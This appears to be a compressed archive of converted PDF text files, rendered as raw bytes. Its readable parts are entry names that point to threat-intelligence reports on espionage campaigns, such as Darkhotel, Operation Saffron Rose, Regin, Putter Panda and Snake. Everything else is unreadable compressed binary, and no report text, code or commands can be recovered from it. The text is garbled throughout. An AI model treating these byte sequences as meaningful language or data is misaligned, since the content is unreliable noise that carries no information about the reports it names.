&T#&
%:#v
Yf^w
43wz
cN*b
i"q"1
[[:g
+&qb
x-O9
.E X
y|Av}$s
\86<Jz
w^Wg
j:)G
hPS7x
sy.}
rN.&
W"Z%
G-sM
FDWkGu
dwNs-
6bC/&GD
]f>X
dUGv
?\7
7Db5>
8gEK
R{k}
IB.YM
SOvj#
De1_
0}GR
2&/
m,!"
;!B
p*Qjf
XmJQ
9Ku|
ft^q
Y79L
p]@|
W=u)
Z$Wo
V1].q
ga0m
UT_]
pS^2
?cBJ
XVru
gen.RN
bDk2
cWbA
1/Y{"
jjwdo
sY_~
k`C{b0B
O^XTm
i8yT
nS^5
#6(}
%*u;
8s4S
/Uy6Vc
3tMX
3R=p
ow_s~
uW<R"
}{H#u
>9|V&1]7
CYlu
+.ZR
}+zi3:
pO ra f
SiPf
bcs_wp_InceptionReport_EN_v12914.pdf.txtUT
-hUX
-`]Q
BC>"H
ZheU
+@})
":;g^lL
R[5W
(&"hs
V"7~
OHQ8
_Tnz=
L^>^
@~ya
,'('
qZ))
REET
LLU@-
Je( 
?"O
..Je
Qx~`R
'Z.m?
5X>v`
Nnh0
n*V#
m\,<g
kO~t
u_Xr@
i9W:
|#9U
4%&|mr
/V%A
5DOG
?@q8
$|*5
o\-.-
Ax0;
3PWSy
q@p^
{|4b
;VT{
|={<
CId=
P)A"
OcG_H
h~/Z
),"x
fc!@
50.|
Vm^&A
iQCJ
~'fc
^n7%'
~ A&
r+n!
(m,i
N<6K
Km6E
@EXG
t+'Qzu
<Y$j
94{s
nd40
|X#r
'Z>/o
i53_.
rvr
!b=D
o{*^
UtM!
|9joaz
6m";C<W
W,FL
K)Tl
s^<9
aZ4E
kN$(T
tF=4<K
Iq3b!
S_m'}`N
ck:
- 0n
p_hs
vIWb
jVv,
>zA=Dm
5uY8H7
t#mnS
!Ms(5
5;/m
p0\X~C
EnUf
[O!8
Z-9E
tP/2
Bn%+p
W):xNU8
votr
i%6$
S"\|
,>m
d*v2
Ue.X=b
BS7D=W
FA{]
L5{w
[kdz
8/88
bghb
Tru1
Fc#*
t[[=
Ct.=
D`k?
#e?[
a3&T
9WT;
cxgP
<"5M
Dz;p}
lCk]
oGh|-F
pg@,
oSZd
.A/a
{K=d
[tx9
pFP@
J|WCB
\Aso
`4O6
"-XS
wcL"
gU/H
@#yi^
srJz
m^{Q
lIgl
x+LFQDw
K{3vdk
yfP }
v)%e
tx@t
M(`1
>Iz0
"^aW
7082
$?2p
Yq4/9
Q}@|
JW@(
kg.N,
'e)q
5^>&
phH;
ou#D
~1@g
XQtE
WHY;
]k";\=H
Q^1b
rX}3
yz*,z
W*Wp
Z"Q,YJ1}
~a*4?
`DqtK$
c?`/
XqPz
>v:A6Dtk
5so+~<
`RA{|
?~,tk
w}#nL")
9g}Ui
6UIy
uAM9
*A%'
A?fU&+1
"gXK
zPJY
H]04
{ve(
V)S'
v=&<)
EcW
e_PP
j/PX
7Xk
HL{
cybO
oATD
Zy3-
DEt`
e(p|
eoOu
g7E0
zba8[M
aohn
#vdp
AE'9
 }nI
: 'PE
!89^
G=Xq*
lN:s
~"$E
:PsC
C=#j
yY%"W
"'6=
!`QP
-#Ll?,
[Wb
AVT.
tFi)
d(hzR]
, 8.
eNK 
wcC5
7RY 
v|l=;n
=m75YLj~d=
=.YH
w%=\
L~Nh1G
6#zh
9cNV
>dO,N
bO46;6P
yA+}F
-hq+
$5@j
(|Jx
3!Tb^M5
x!ZZ
AJ_vO
*Z'n*5
Iy%c
qK$*iK
'ZDD0
uPJF5
e(;f=
~f>+
 ;Z^
$0;+,
C1-78
\)Yi5
8UW;4qp
>'g:
.;u'
)^uVy
d`#aF
GU=`>b
K8PC_
6Yr,
CytA
7yY@
X/{I
<ay-=
C@'N
#l"'!
U'"9^*
)}]X
9U)H
lZH+6
6.~P
kP\hC[
"Y=G
2XX|
2C|&
QdLe
rk|i
Zq*vh
UOeb(
>fl2
WlNa
.6^]
<LhP
sTi"
-XlsSl
eP_1
XU-g
3sRM
^.:n
us&l
HNd0
aU5@}(xVe'g
V!Dr
2!,4'
Aki!^
qCO 
&V!h
(NX<#
<jz\
UTzw
:{i5
a5>P
f"yD
(vGT@r
o1KZ
iKwi
jZeT
.kj(
&cdl
Rj0]f
Wz4"
%b4*
'[(z
8SES
\ag{
$BtS
&bSrY>l
;y3r&
),<m
>tj+xz
darkhotel_kl_07.11.pdf.txtUT
DG"k
~0ZF
5so%
z[507
W1([S
Nn+d
<w4
@_Y2
PkPEt[
`!I.
w3w1
*plkh
%XxF
X9Y"
uVNo(
BYDH<A:V$o
lg}Y.9
MJ|!W}4
X#xJ
m=x@
lvTva-
'lq^
',2Y
NSik
YOp<
H8.+
&wjAJ
#E?8
'"qn
t\aW
>nJPmz
bmTq4[
s\H<
_/c<
u]k3
r/J5
TSu6
ZtE'_4Sk~
)laK
\o[(
eUt(
3`Zx
Y;a;
R;H0{
p1[d-
l{'Fx
r:R2z
[f7h
AC<d
?rTB
^l5;
SB*3
V,k&
!eBu9
Q/Z<
C%Nh
a7c'h
ONKE%
HF;'g*
ju l
njV3j
#JhrT
kPea
~lh_
|YTy
3GJm@>t
(HB/s
5O:E
[biP
bNQ=
%$79
;r-7
_C>L
AD5=!
[xc5
c"C]
[uyCq
3G)*
|o!sw4O E?=0
e%Ys
dO2U
]kL%O
zH1>w`,Z
OpM7z
^nK~
tQOK\
NHC+
vyanw
WeM7
 }I[
_WTco
clk"
UyNI
|v$
"0z&
r=bw
LHv\:
wN6&q{J
~N1HQ
&"(x
!{9!O
0^g3
hal|
JoA"
*.yu
@cY!
2WcL`
*t,
?!GPL
g I
UQ14
]edhrX
M(hP&B6
"O~_m
H$je
PUnC+
>I`J
O|+{
IG}_
Ac>u
e&n.
mGXE
Y`eF0
%'%\
8{v[y
r|oD?v:Aa
$(kH
 b`|"u
yoZ>l
z*-kgj
5HwSk
U,\q^gS
i^Oq
Y$5/}
CkR= 
{+Bb
5UGz
$]-s
!WUu
m9n&oc
1U G^
aE}>
~q}}!
C^k2
<kb:T
E}Ixq
zmM0
*KG*
|/_/
nU_`^-
A/niD
MD@Su-
!|>Jp
"EtDV?
q($xm
bs{14
4Ms"
avE7<]
-KlU!3z
"#2]
td | #CZ4o
QEjc
iEht
}rQ[
cR*8
2@y(
?3zPN
S0&8r
l[k3c
&{KL
78MW-
C?4LL*
2n^_F@v
0R>*
:>ol
tO)@
@]w0-,
*},Y
iX=d
z`5H
B,$F
Wr~e
N`Oe\
pM>S
atMu
QZ%5C
u]<^
aFF@^K
I=$y,
fC{d)
RAPK
darkhotelappendixindicators_kl.pdf.txtUT
h)cQ
{JCW,d~&
zn3l
)[T%
Cz*"
WZ=-
80M3
SFr?
]j}k:
vh)5
wbl'~}C
y[mrB
%#s)
;/t
\tDK
uBqxX
ahZk
45-_e
uH4R
5eZ=
;jw!
E7"p
Xx^<
OXzX
WW!n
Y| S
J)e"
fE#d
sRqs
YSF$
Ji\f.Z
EiO_
1^2v
1!=>
-?1IwA
oP;T
 lOl
,xz_
o%NO#
Q-As
5g9L_!CrD
M6qK6
dS|z
9@U>
ZL82
Rz]e
<WS:
i76q
5*yM'#E0
UIZ&!@o l
;Id{
]_$i
.,9o
N"F_
L[VS
/,B#
2du|
(|.+
KC`pt
RVDk
R\s/
wohKu
Z@mm
6m:3
WYvJ
"0HS|
|Q{I
) F
g}f?
&MQR
h1^'l
r?kv
,-{R
u%^=$
H[aKQ'
IC=~f
o9lH
F{u9
W<F
;W9j
@RB(
@cJN
LsE)
PAA(
)2#
s%|y\
P>ax)
/u?j
]A?=
RrA*Ky
f a{Xs
HA,n&
;)mY"
20bK
~${;
(b+7
K9wi
~0:=r
'#8WRm
,*c[T#
(SnE
+Qw"
lsV@1
I55N
8WDb
fg_O
9Pj"
%j47-
+Sgi
NG3W!
5x!D
cD7y1
}"n`
NDw
*U)/s
5\Ev
Dz3s
=mWh
M?[fo
r/Y$
sQN|
LXJd7
iC~M
Kpb1^
b;e`
NPmoS
SA`o
^kd`d
@4:E='
u@Ib
~I+ur
l0=?
/%t[
~wD'
&X&!
I^=C
lRQa*GZ
]FO-
iVJI
Z-4]
.m9IQ 
i_V^
#&`H
_2##
~X3z
w !'
^4 #X
s2zT88
*W(F5
1.{|
Dc3E\
C%$j$
Lua^
h$4"
-d['
2!-.
<up_
MJm6
"`al
p1I8
8P_*S
^7kN
{(\WG|
:+#+
f2ZLF
\,D`
!i +br
y:(S
obNDdxz
Q}G.EV?#
<^maC
RB'B`/yc
h982
QW3=
L="e
zOe-
|!Id
JI.G^
 8Zy
W:f!
eb3@0&
f@+?w+
E`|L
/S`^P[
aH2a
3q^k
F$rut
|"h(
/-Iq^
{v:Cj/@YtWI
Nr<(
8kDW4
E^Vh
ApCW
##p:
8j2F
fZ7t4
{fYN
4O~DI
-3f,4
!vS&
{C0Gw
_5Rs
E0gX
s9O+
lS}8
QBK~
g4@]X
6~q^L
}Gj(
O-S,cl
]eac
7|\
p2hDI
~X%F
~*Q^
e|Nx
c 8e
2G(M
gg4>
4J$z
uRn/!
@B9>
1158
iZ[7*
qFvP
R`.@&
<omt
5#s+,l
qpA~
+w0Zr
^TOS
q[C,"50%*
5(j}y
mHMFm
+.^~nG
;V|6
,eFT
\)rA
eG[A
L@7l
kr0V
_G,a"
WQ$d
1[_S)qR
1W*1&
AAYy
o+KJa
;5ww
"_sD
-@W\/
^_$D-^
Z{+Q
%M9(
_%~F'
%XD'
oh#9p
&HNfpg2
X7{"
^GOX#
;CA|
S[A&
l8Ab
OjF-q`!
DJ}f
T<\M@
VEYH
p5}-_{>r
yK Z
qh7|
aMzn
MCPT
k58K
%2w`
a!X7
IT@/
o4hP8D
x5l`
oGn6
-9,a
$p'9
eW.P,%>
.{5
v+~4u
]90Uk
Fj^3:
)#R+
X~^^
jvs{
RxKtXp
ZL&@c9X>
SBD"OX
&q.) 
!b-a
vPT-i\
XO&G
,E0N
3|IR
)b55
{D{7
^r=2
w.l3
SAl3
'yMJp
,mF"
Kfp@
xTH6q#=C
T6=s
npWd
enN0
3B4{
}N;s]
p|#+
?(T::
Pc8s6
R5K,
R?kdk
S w-
A\6wf
A@2'+H
?]v!
gd]e
Qd|_B
GI5I}
&9DR%
"R|=,
1p2p
+wT@
?'$z6
5K%Y
4de*t
]q6h
ulpL
uR;:+t
./By
@F0mM~
&i!*
XQ4kt
\J})
V6{)J
Z?Q<
i9,n
rjj!
g(B0
i_e4
<$HC[
JaY.
<Ma(
riS[
@Chi
*JTK
89(UC
qktvwPy
g`,?6
s8B=
++Fw
62N7&1
AfG`
v?J0
'e/YO
WL}y!
(bt!2<
kUHl
5o)ZG
HQsz
Hn y
[!Q
-jH#
Ku@kX
Fhzr
D2:p""l
e7/:,9_
ZQ||
T-^k
J@)}]
e)!e
hBdz
ll;B
#T=l
Y-]l
;zUVU
_|"G
dy.w
HF'/
?(9Gk
eLqC%
/t/f56
bp9k
q"m:
YyJ?
$hjW
;l={
Ax%^
2x`)
]G\ [
~MQ^)
LSTm9JF
rV,D
@L}x
&\{)
x)[+
#-m,
<?XTh
+EU={
/%KL
)y9z
} 9
t|XB
im/n
%\a`
jd9@
1%=+
N@?O
|(iJ%>
9>C
#1U`,'
M8qPq#
dbqZ
tIQ
oT(:
;sD!
CF6q
0.z)c
u|,Fk
T*nz
[4ko
l9O~
hJ$A^d
h:uuw
r\b7
"&+B@
>L>1
e,|<
L^=X
kxQ_
E`28J
-#=6
hDzI
<,L
cxYe
B?GP=
0/nE{\
Ou|p
nKA4o
!8x,8}=
tqCg
%j1f
iYq``
>KQnE
J\O<e!
v`0c
.fiM
:;=&
/&td
~5U[
ym{m
NlSr
uz$d
cO/N
`Lp(H3
;7rY
I"Aw/4
k{}k
k{#"
KC=s
P/ly
c2Doyg
h|&
CS@b
i$Y)
PA|(uZ
Gcn[$
;cl_3G!
IN,oo
b@.1
`* )
2MAOM
3~}B
gs$(,
 Z6|
7V Qfz 
^Mu_
JddU
fxlE
X,*sX;
C%JI:
 }=7e0
@3H<
-a^vsAY
].oF
*z^4.
$",+
*Cl8 I
gwV,
1SH[X
>eJ3.
!.C*
=9,'
UW[H#
bwnN
]6}/w
-E^[
yN'
_3k~
E?f6
_D&@
5Wu3 
.9zL
L)Yf
48C6
]@9H/?@gS
]S-@f
^<xKH
1a7l:
w7p.
B-eYT
u<#,
`8_L
?5^YKx
^$7P
${Gf
{Bh4
j_Wi?
Ved?
g3_=zX
s4W+
_g)$
U"#%
arM
,()
N!l'
9uNz
V r=
*!:Rl
YX"0d0|
ejZ
`x!N
gSEv
2"~}"
'63!
pE-X*
rS9I
kV,_{c
HY3pb
+T<)
UK^m
oedY`
^j4&
w{B^
:VsD
>mG.W
9x@W
Fgpo
N31P
/@n
A=x_
LMZJk
h(o0
[ukA
e{XY
7;;0
%'-O
e{A\
yeq8
-bjQ
`*MC
nO:j]
/",1
Q43:"
%ID*7
a-DLd
!bEb
 p>~
%6'!
=_/x
=2)]mo
r&1V5
40Fm
L${,
?pg8
$VpU=
e+-b)
[N7L
8fT(`
Yksg
m6?V/
v11qK
o$&m
1g-B
fireeye-operation-saffron-rose.pdf.txtUT
]IsL+
" {5
N)aE
@D'+':
S6Ao
v<|$
m0pO
GFA3
$_b ^
W'#d
*SZo
!B54]
@*;M
\9%`
 4qX
7vLkK
0G` 
Qh;l
RGO8
.wj#mg
=>dh
H:x\
]dji
rCcb+*l
A@&e_
]UnN
;`lztSP
[EH
:<L\
epTK#
rxu
>o_S
2VSG`
Eih)
;&<_a
gmBu
T:qg
Ww'TT:Z
Mrc/1
zR/(<
C4?"\a
9hG,
VC~U
pCWX
UN)i
.4PF
c}gQY
5{4x
r6lZA
](/V
l`\P
ni*Ae
luVz
=_S*
{u)\}
?hbaH
GuP8
?CLs4
68a<
<0`o
WOz%
GDks
N74%
*R/
w6#I
PVJT
XtT^KJ
u9!\(
9E~A
'Kb'
LAWJW
>HY!
0o<
xI2q
~|'x3E*^
n"NH
^y<j
Pom@c
]rs$"M
U.lO
bgz*
y_|
7\@4
u<(Z
Q!bz
<\Y9
dj'H
fr,tn
3g9pT
k!N_
2!KA
FhhL
gwP9
d8T~2
CVVf2
"%.tr
vY;n
cwN@^
cAQaVe
!e"D+
lCD
T m}=jm/
"'ENo
5,@q
y)mJGH
*b$T
?h$oN
$I}{k
&[.7
(fT@
oi2N
S0+]=/~
u_Jb
XA.h?m
fgxr
h?XQ
V\k0
Bm08n
H1=s
gCBrC
EKf6z-1
mw~B
jR4)
hd,w
#{1c
CI(%9
>6ar*
B0=3
3_tkU,
+6%D
[Mo?C
45g2
FZvph
4;4:
b6i#
1i[r
KjArL
iN!|
e6L8
).(4
:p;K
x/x^b
FA\wOR^
.Z'X
Y)[k
7Gup
_:yAw.
'6QF
yEZ
i%U[
`HBT
9wdL
<T}]
,,i5{
/G~1
.>2G\
BX*i
M{zzDB
Q,U7
A`.\
A1h5
+MB4
mr\f
#,X.qp?
Ai?lF1
0v|U
XsF?)r*
b{ZR
#{9PK
fireeye-sidewinder-targeted-attack.pdf.txtUT
5;%5 
C&3N
/)g2
f4)&
TGC
C<%,
iG+T
d8-mL
yHB(
5M%\
ccL|
l:Vu
?g~A
$,Q!&
%o>y
|N F
8tm;
#)Hz
MscK
cWp#;
Y[0N
;,-15
\3"/
kBcYuD
XE_x
}/I +q
>"n1
,n^?>
2t_i|
q5(F
aHG/
"EX:B
abh[
Q[AD
3OJ]
|1=f
oOQ3Q
lg62
6Kat
Ne$^4Ub
uH8$
ji^W
-AE"
Xa.
g7%JX
&Io#
^wRuk
S89=
S[cc
zE6xne
NVbd
lWV,
a<xA
-jQ5;
Qo)5
4-fA$
z=~Rp`
Mf+@B
^,Jk
D<3:}
-Uv=
)o@l
%fUF
'X>|=U%$
`qI3
>?ET
fYok
p% }
2h<TU)'y
Sn1H4g
daNy
{qC)
1.XP
&8N"8
`RmP
lQNQ8
Vh o
nCX1
 1)X="
X~$X
Z6+"
"s{r
??Vi
Q'3h
 }j,
|57I$
CLY@
&;h7
0jmy
G$<`9Rb
_)VCT}
(+Ix
8*Jjr)
\|='
P#n
#1o =e
]Q{x
x6c_
@3)h_
\F0=E
E_sy
f8L+
^|d@>
)I_h
/MjEt
},)^
5/#l
TPO6{F
&/L~/@
57n%Z
6kZR
'v\=
ptrs\
[if 
-pIv
BE^S
V|r:
(F{2
O3Pi
z`Yr
6riy
KyUkb|g
nwV3{
\p<7oS
QrI8
%d|R
&^v%
T9^&
XN@L
cFZ@
uDWkZ
j_bw
$1ael
w?E_
},ao
)Hyu
 V3\
/+c>V7
_iU:e
4v0`
!tQ<
-'z9
|9U|P
Bb(#
._SKGL]
x\'n
-"Jr
Vy1kt
m:zFJ
9ftX
%;/xj
]fxq$+R[
-I9~&
567\5
1zBt
V`>.
bikR
))Xb
[3Un
kiO{
}g,9
-KV1
fM>'D
:B@N
Zx?/
Q\Km
*gaO
b})M
JT6W?sa
6WFu
@ZY
6~E<r
xtWGS
05OU
""1:0e
XVY
C),j
!7:V^D
!#""P
@wiW4Z
p,']j
tILE
lEM
Vri.
1wBt
,G&i
eSjtY
o.D@-
|H4&.~0tr
Hr{ 
Hz&
operation-poisoned-helmand.pdf.txtUT
.1~U:
VryC[
zHao
A*C3
;?,Q?
<l?C
w*l^
=mVi_
^5'}R
)(~w%o
^oJ1
)C`L)
X<`;
?|`p
@`O
BT%z
MWyf
pqCH
-Bliq.
KR<+
h=>~
2)e(
wt^u
Ug+V}
PoUq
wuW8
D;$=*
"Y.29
jb.Q
VrZ%
$[HV
G(4_
Vj12Z
8v&G|-
}QSh)q
PwPi(
Mq|2
~+0G
H`&Mp2
|p{o
<fJd
K[pa
x~UD
?:,p
s%F<
U3C-db
Eb|bv
;K1>
(g^_
"5-)
XbaY
,&,R
f1g
GMzB
NR}Y
$B&i;
}]9.+
]qaC
putter-panda.pdf.txtUT
J.MC
aelmd
-y;4
|&H"
1h7iwT*
4z1x
rwj?
h)-O
"+nU
n,oF
4Zi>
nxd=>
9x('
a^j?F
3H>$K
SC c
lzUxt)k.
uq&KGz
JLB!
RUiK
gA;W~V
v65xVS
ItZ`
6ON`I
<66m
,eRP
>v/A
}?%A
kq}K9
N;V?
z ^}
-M*$Jzl
@W>u
IQh>
D &4J
Z(-y
F;`m
HGRH
&Tw
g%`+p(]
Zwk
_!f1
oIoN2
/NCa)
;{yk#
hK&%
@fX3
K"IO}Q
!8o]J
678>sf
Dco+
A1[T
n~84
/B]=
Sb1Z
I8GO1
&KvS
,S6
'NQ3
eWcQ
n9mb
fdh2
C'tG
-Qh~w
6 8v?
~ZduJ0
;CV}
.Pr8
0j&Cl:
x8Wg
w<T`
3HZJ
gJ=[
rZ.=
AZf*
)J&3
f 11J
wti+#
H8L?
P?qpJ
:_>^
j h2
Gqt^]g
Q8g[
2V*/n
wL(:
o{0V
{g[k
T%b_
gg5^
'/.U
VzK2
%3pb%
F,o"
7krN
`%#Zi
~A4)PuB
((zu
c8Y?ZW
R62g
9SepJ
zNjNs
6u~Lmt
5#cS
+yh[
0J+yyb=
eO)w
*kgK
K\Qb
u4FDc
]OD9b
l+zT
*e6D3
5L{~
jfuo
fC4'
n2vJ
RSi~
 kXck
5;v9
dCxS
57@%)
nZ8M_^
o$No
zzA`p
S.)
b?8g
J<u{
wIB"
+om
%`~#
h??R
M1k4
>ygZ
U6YFL_Z
y|M'
xx<on
7-Qm
y3aR]-
Nv2p
d@^-{Fq
6E"t
gT^X
]]3
]9=i
3eL4
WKd3
%nNCO
Jd=L
,0,#
Gui(
hV$kQ
RGt2&
QHD<
6Y-h%
4\\~
z3`B
NK\y
E(<,
T7!S
;${ae
kla
]YQo
5298
}!Ti
<{(oV,
L&lg
SH9=
3%4t
`fj<
MC:oQ
vnj^;
l k/
>CIN_
N!5)
mb;+
+F:I
YSF
Tu9.a
'<&i
aF _
`9z8p!2
;1))$; J
Y Hu
|H#g
=s|#
]IT=
~G?sWWc
G9M0
L"Em
=K~W=
h.]_
r-mu
VqFF
%iE8
Z5,kn
%!knaT
z)NbA
P8s=
[kX
op.>+
e31a`
;*O g7m
p_o<
]rV#
r~w?
s#xJ5I
*Vux
K*hG-
*|pc?p
<k[9
"[#^  
G^gnf
`%le
/:l/
!OG]
+":'
GT'u
!dhZE
%X{2
2)Kh`
Fj:#
S"/3
s<t[A
&VvH
9b1^
WIdw
qd#U
.S&e
"KD`
"]?x+
m1Qf
k6D/
*M>
ysdJ
D#PMnQ
~EGb\
xU4c@2O
hzJZ
ZGdq
<#Ne
_e1r`pm
ByzX
=dRKd
/~lIF
\gDwfO
H\q\
'-3^^
dlL9G{
,tuZ
GTjT
vB\W
]T}r-
s"9p
s8R%
~RsTR
IVA[
$tf>V
s+)j=^
2&~N
L/pu
dIb+
J6T9
+[pLE
;AF8
))Hw
3X7o<
]#r#
Rp*!<!V
;OP7
-[ZF
/{7j
E2}j>l
regin-analysis.pdf.txtUT
j+bC
9Iu%M&
T#Y`
mqnU
6Pi=
V>C^
)Sls
Tp!>
D0PI
z738
kNaL
6nsZ
7_3QJ
.BH<
s:cQ
Tv15
o(Zh]
_|a=$
`B;d
H}{n
k9XX=
8j>Z
@^C<>
1fA{"
y@q*
$Y&V
!vQ<
!J(!(
mSV(
?E+f{E
_f,L
 VQn
yC~u
NcQ)
o!:.
lD;V
0zFKr
mpy
c#/x
$nobM
vK$X
]dg[
?5Uq
2<E%K
E)i]
z>~I
!w<V
].Fx
p9_af
h{?kM3*@ 
>LG@
Ff:WG
bx"]o
wEii:
57T/9{L
zh-@E|
RHFkv
)I$ Hr
<ii_3(
o8~Ab~w
Ilg0
W(>7
G<OC
?!7V
@yz^a
aNkX
d)PPlJ
JK$&
MW^D
XT, 
BqN0
c;o5
,`Gj
3c}>q
?{25
wL{h
BCf&
)bZZ
jYOq
,[Xb
gO8H
_?xq8
-]m9>4A
QB}[
kk7w5b
":v
^I_x
PF7R
p8#V
3qbP
0-P,
'ap)t
eFB*O
?n#W2}(s
bh?A
#]!S8
vGe|e
#+N`r
h0V1
1+;l=
PoWn=
QK|)A
<2e,
W)"u
@"!a
mR45
~+nw
~.h6
ix)v
~yi_
Vn?P
%]r5
_MAJ
c A_
sJ:H
;` i
&a<D
PgV6
%OQ7
|hZ/
J @w
_R7p
:za8q7
|aeb7\
*O3Q
8jSd
($T&
*0oj
,\wuI
cy]3U
SA)w{T
o!:^
BL{-w
5t?i
E_\
)~Iy
H==d
FgL6HA
p!=/
IDb|
E>N\
BGyVb
wJ\6
haRMCH
AL*/
HPM3
i=$\eFG
>&DS
9)2Z
>>N%E
%(]&
z';?
HTzG
%c-d
=;0#
n`!{;3
c9R&
zMU<c}
q]%3
:T0F
.OM|7
|oms
aLu;%kg
s&viwWF
}sx;
9K&x
z6"}a1a
j(] 0
?;KC
io?8
8YtH
hv;3
fpIe>
zw1.
NPW&T
f.`j
6B!
tSq+.
dPtaR
:bvx
sec14-paper-marczak.pdf.txtUT
@Fn)
79$`
'Z?a
q5Z4
X*FZ
]N@fB
H55u
a'Kpm
EE-)
XxQm.
\w`|0
$C!C
/#U{
?O4%
!Y9|N
la7R
iRK<c
`Hk/
4_fAi
roI"
P&*TT
jx@%
y.DH
i3Dg=
UPho\|w
Ng0 [
=_.fv
2^KDo
[CIz
4I)U
+:9d5
+.ob*
p:jh
'Q-G
>iVK
s-E{6
.0xf
!WN-
C[jS
~LO&
oOd|e
|8%#1{
"[k{y
X$%c
x%g@T
qND^Gq#
n&I<
-U;"Z
l$IWv
]D6c
U~R''
!mf;
)}Wy
]R(
 /-B
*WB*
1YtN
SX6B`
?Z^}
PWtDV_!-
^]3$
-F)J
sp}[Gk*
*6yp2gG
[qcz
e\_qp
Am"S92@%
$Uoj
5XjY
}w.6
/$?l
RZk{h
+78<(r
Gae|
~} @T
f-^|
Ceib
]o7J
Z>19
PL" 68Z
7U[W
Kj'#
QnNf
w}BP.
0T1r
mW*
>=&H
ulrds
WcNg
3uH1
]X-?<2
4:4dT
3=)jB
;2Ho
dvv0?
'Khd<
BiA?
^X~ 
m[f[
LHui
->0.
(jNRO3
ZAel;I
fs B
 eHy
Mr>_
R8fo
vY0Id
h?@q
}QKPBUF
,-HV4BD
0Shen
8+r:
tX"W
fg%/H
k>Xz
DjP{D=
Yo0j
&"Wxk
i8fm9
HfXC
W?P^8
]YCRBk
Pf0
rv]jm{
s~sL
?L8z
_e#a
7d[EO
;Kh12E
k fY
=6X
F=2V
<dw
rk|6
l~0Q
4)4F
g^$
9>u*
j}7F
p|nv
vh3?
ND-
v&r86H
+}i~
y7Anf
'Fu+'
QU:U
&4RLf
HM7Q
4C,R
!>~y2
jT^$
j92']u
!pzr&+i
b/$,\;
Q:9EOPm
%BjD
"[{h~
&W*?
kZDH
#}od
m+[
h{T,i
u^8 
L*uaN
B^Wn
qQ["
9N]9
dn/6
2!8=O
;>SN$f
#izg
e*ygR
r9$p 
u,]9,v
ZFb9
[LYx
ipZ[l
e]`6
h2-X
Z4^y
R&Kk1i
E=.4iC/
A8_S
k5.tp
*H0I
TQqWJ
1KO@I
qU6V
=.l:
]jeW
I2"f<
~{@M|H
|1Orl
!IV5
[P'M
p/V
EWJg
dZ-H+u
mk]v
C/;g
eIjC
0[Ww+H
b.ZP
\i-c
a"k]
X|+`
-q7k5
)MknA
PjL\
#p"<c
qRS|9>
}BmW
Tq"[
*w;e
gu7(
hVG:
70v0
,P*L
Q<a
L"}iX=/p
!*/q+&%
tI5&
cDdx
6b|2?
7-`z
H(f>\
v0\w
dMj&
s"et
FSmB
}v]b
<}lvm5
m@,l
4u+^
o<lX
5&Ep
#i<R
4WuZ
LP+)
0aEo
]/D<
uce_
zTP]%$
'`p#l
fI$_
<56F
`&.gM
-Ii hsj5k[
9nm.
P"r3
C"Y63X
D8+(
+d8P
Z7-B
W,s
?;U3
T5yl
hyfN
GmT8
{x_]
PJCZk
iR*wR
7O=KH
w"Fb
6NO/0r2Na~)
0eQ^M
4v N
I0Wd
a[]$y
v&pR
P\jv
|<b-VO#
SfAfnmN
 gVlS>
]<KH/\
-HPd\ 
1(TJ %
VW^'Imm!
:3=5^M
M3=dC
5(LD
2CUd
h{:CA|
&cJGl
yT=x
B56W
"W`i
@`'u
,$x{
u0#h
m:pT`g
[wmJM
`cHl{
#@gzw
(i!R
Dk&7
Eq"$
y6LR
)?$A
U=1vTE
ehp|
Pb:Z
WT+4{
>k*t]
*%x36
"{Z`
T1nT
vZZ!v
&!`\
;Z`x
T.fU`
_PK5T
T(X{J
1`hcq
RMg`D
]Ef4
).h`
*,Jg
A_vE
Y_;!
)Z);
gqbo'\
? $d
7\l*v
;IX 
?IJc9
$hNu
E18i
:FCR
>O,uZ
Lepw
438X0xi
d0B]J
/nw$
+%{R{
jLk}%-'
`|Hy
wD7"K
[Z[,
zR&Y
D_1.
a[m\
e9OX
vKk4s
2Q~35l
0oq\
pPd!qg
 AzT
f;_Uk]
t>gE
d8@~
,Y0Z
oob1
'E]>o
d3k|"
&P]*
L[1#
f*'{
Jx=g
.t|4W
49\'3
&0gdX
\|'aj
=er
 3=p)K
G%w)&j
25/?
vAY[%
:1ONgN
zqt=
uF+f(Fj
uB2G
xzy'>
<\:Y-
#LE/
I?n(
rx"|y
tvN/"
X#R_
(-k
[y>T
J0q.u
8M.x
Y%MA
3_EC
qz.}V
mxLq?
Jeo>
7i6}
O{& ~h
#^/>
FU4fI
` ?I
]++6
"!P?
b-q1
:r]Q*@C
!{t{
?lPq
Zt+CY
)mPK
snake_whitepaper.pdf.txtUT
TTePd
kJ &
*i7u
62Dh*
bGG;
0%hb
[9=x>
xbI 
{PN'
hRfwq{
4Y#Q>
7^.9
3Z#n
tRqT,
1~Q3
km0n
@(6w
6_TLy
^,[h2
qWhw
~o^u
$<hvrL
P]`N
nsXC
*jZG
2^B?
Esl5
N"'~;
0|Q
fnR(
 [eI
^8o*
\<Y'x(
.g|"
5mvT
)dU$
7G/Ms
ACtD
,Xlx
DK!>
5Q_z
QW<:
&WUg
p-T.
3>8;=
K~'o
o TT
=6T=X
dpT
A%K}^}+aC
sQ):
bHHH 
}Ap&
e2[d
LvBl
6VlIO
(*tM?]
:)s#NMy
l:Q)
KZI,
Pmc&
_0H_
{#^j
62rq
U}Pg
Y0r:
cQIWm
IBJd'`%.kk
ah6'7%
*uWajpY
_{:[
X-Te
^K!U
;q4lcm
T9axcLL
cF"F
^S[V
noFhrWn
BpS~
c|'e
r4 Z
]@"er
(TuZ
sC=fH
pr&O
'@N{e
kzqM[
vRmj
LM]l
+{.Ek17
gn{B
U^RQ
M\.v
@=`n
o:V'
%!iA
EuA'
ht@0?F
X S6Rk|n
Sq9"
)i/#
,p]y
gt?v
j#8?2
p5V/
|4Lh
o1p:
E9_l
AoF_
5d)j
8WdA
7QZ"
Q|5!
RnFTR
-qO&Z>5
1;]+
Gcqf
{XuP9
}idU=Y
Ec,R!$
0q`H
Acp6
Ay@hm
O6,9
*2sle
J\pm
c~en
=AI.Q
[7~Q
".v"
C4&/$/
C>o0
|z`m
g3B;g
vY-l
#yz\
2a;,
x?zcR
i^c
U;]t)
$Ic!
CCNl6
\.eZ1
M@o>c
&M\(
91]c
-fyz
k9Lk
xfW@
uZ{V
/>/:
M@ESn
\f7y)
L8!K
#ZG>
D8}z
k{;B
1*_kw
Dm[k
@]\t
9ycb
'knZ
h1Q=
!JFx)
Nl9H
%V'ha
s!m<#J
?#\c
QUB^
Wq[#
QE_U=
HQ|eun
1vf;
ZP0R
W!P0
O#%B
Z a^ok
O"M)
1Qz}
]_!Qv
\'3
;\3R
.Jg{
{LC[
w,p4
(X_altk
I;)@
-@Cx
0c$/An
DZo!
,CTJ
[F7yS
/*W<
FsT'
qw<c
